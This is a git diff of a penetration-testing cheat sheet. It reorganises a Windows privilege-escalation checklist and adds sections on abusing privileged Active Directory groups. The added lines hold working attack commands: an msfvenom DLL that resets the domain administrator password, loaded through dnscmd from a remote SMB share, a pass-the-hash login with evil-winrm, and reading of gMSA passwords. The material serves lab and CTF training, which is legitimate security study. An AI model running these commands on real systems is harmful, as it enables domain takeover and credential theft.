@@ -211,8 +211,9 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Postfix](#postfix)
   - [Windows Privilege Escalation](#windows-privilege-escalation)
     - [Resources](#resources-3)
-    - [Privileges](#privileges)
     - [Strategy](#strategy-1)
+    - [Privileges](#privileges)
+    - [Privileged Groups](#privileged-groups)
     - [Add new admin user](#add-new-admin-user)
     - [Log in with another user from the same machine](#log-in-with-another-user-from-the-same-machine)
     - [Generate a reverse shell](#generate-a-reverse-shell)
@@ -5374,6 +5375,42 @@ See [Information gathering | Windows](#windows). Always obtain:
     - `windows-privesc-check2.exe --dump -G`
   - [creddump7](https://github.com/Tib3rius/creddump7)
 
+#### <ins>Strategy</ins>
+
+- [ ] Run the following commands
+  - `whoami /priv`
+  - `whoami /groups`
+  - `whoami /all`
+  - `netstat -ano`
+  - especially seek out for services like `mssql`
+- [ ] See `systeminfo` for CVE + `searchsploit`, `wes.py` and `windows-exploit-suggester.py`
+  - see the dedicated sections for more inspiration + known exploits
+- [ ] See if something is out of place in `C:\` and `C:\Users\username\`
+- [ ] See the programs installed in their directories
+- [ ] Run the scripts
+  - `winPEAS`, options: `fast`, `searchfast`, and `cmd`
+  - `.\seatbelt.exe NonstandardProcesses`
+  - `PowerUp.ps1` -> `Invoke-AllChecks`
+  - `windows-privesc-check.exe --dump -G`
+  - `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"`
+  - `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
+  - `.\jaws-enum.ps1`
+  - more
+    - https://rahmatnurfauzi.medium.com/windows-privilege-escalation-scripts-techniques-30fa37bd194
+    - https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/
+    - https://github.com/SnaffCon/Snaffler
+- [ ] With meterpreter, you can run the module `local_exploit_suggester`
+- [ ] In `C:`, run the command `dir -force` to see the hidden directories
+  - one interesting directory is `PSTranscripts/Transcripts`
+  - keep using `dir -force` inside of the hidden directories
+- [ ] Check LOLBAS: https://lolbas-project.github.io/
+- [ ] If out of ideas / luck:
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+  - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+  - http://pwnwiki.io/#!privesc/windows/index.md
+  - https://fuzzysecurity.com/tutorials/16.html
+
 #### <ins>Privileges</ins>
 - Paper: [Abusing Token Privileges For EoP](https://github.com/hatRiot/token-priv)
 - List your privileges: `whoami /priv`, see also https://github.com/gtworek/Priv2Admin
@@ -5471,41 +5508,35 @@ Other
    ```
 - See also: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#shell-as-system
 
-#### <ins>Strategy</ins>
+#### <ins>Privileged Groups</ins>
 
-- [ ] Run the following commands
-  - `whoami /priv`
-  - `whoami /groups`
-  - `whoami /all`
-  - `netstat -ano`
-  - especially seek out for services like `mssql`
-- [ ] See `systeminfo` for CVE + `searchsploit`, `wes.py` and `windows-exploit-suggester.py`
-  - see the dedicated sections for more inspiration + known exploits
-- [ ] See if something is out of place in `C:\` and `C:\Users\username\`
-- [ ] See the programs installed in their directories
-- [ ] Run the scripts
-  - `winPEAS`, options: `fast`, `searchfast`, and `cmd`
-  - `.\seatbelt.exe NonstandardProcesses`
-  - `PowerUp.ps1` -> `Invoke-AllChecks`
-  - `windows-privesc-check.exe --dump -G`
-  - `powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"`
-  - `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
-  - `.\jaws-enum.ps1`
-  - more
-    - https://rahmatnurfauzi.medium.com/windows-privilege-escalation-scripts-techniques-30fa37bd194
-    - https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/
-    - https://github.com/SnaffCon/Snaffler
-- [ ] With meterpreter, you can run the module `local_exploit_suggester`
-- [ ] In `C:`, run the command `dir -force` to see the hidden directories
-  - one interesting directory is `PSTranscripts/Transcripts`
-  - keep using `dir -force` inside of the hidden directories
-- [ ] Check LOLBAS: https://lolbas-project.github.io/
-- [ ] If out of ideas / luck:
-  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
-  - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
-  - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
-  - http://pwnwiki.io/#!privesc/windows/index.md
-  - https://fuzzysecurity.com/tutorials/16.html
+- [Privileged Groups | HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)
+
+#### DnsAdmins
+- https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/
+- `dnscmd.exe /config /serverlevelplugindll \\path\to\dll`
+  - as a dll, try to use 'dns-exe-persistance.dll'
+    - you have to recompile it with your IP
+    - you can also use msfvenom
+      - `msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll`
+- Alternative
+  1. `cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.34\share\da.dll`
+  2. `sc.exe stop dns`
+  3. `sc.exe start dns`
+  
+#### gMSA
+- If your user is part of a group in 'PrincipalsAllowedToRetrieveManagedPassword'
+  .\GMSAPasswordReader.exe --accountname 'svc_apache'
+- Retrieve 'rc4_hmac' in Current Value
+  evil-winrm -i 192.168.212.165 -u svc_apache$ -H 009E42B78BF6CEA5F5C067B32B99FCA6
+- See accounts for Group Managed Service Account (gMSA) with Powershell
+  Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
+
+#### AD Recycle Bin
+- It's a well-known Windows group. Check if your user is in this group
+- Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
+- Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
+- See if there is any strange entry, like `cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz`. There might be a password
 
 #### <ins>Add new admin user</ins>
 
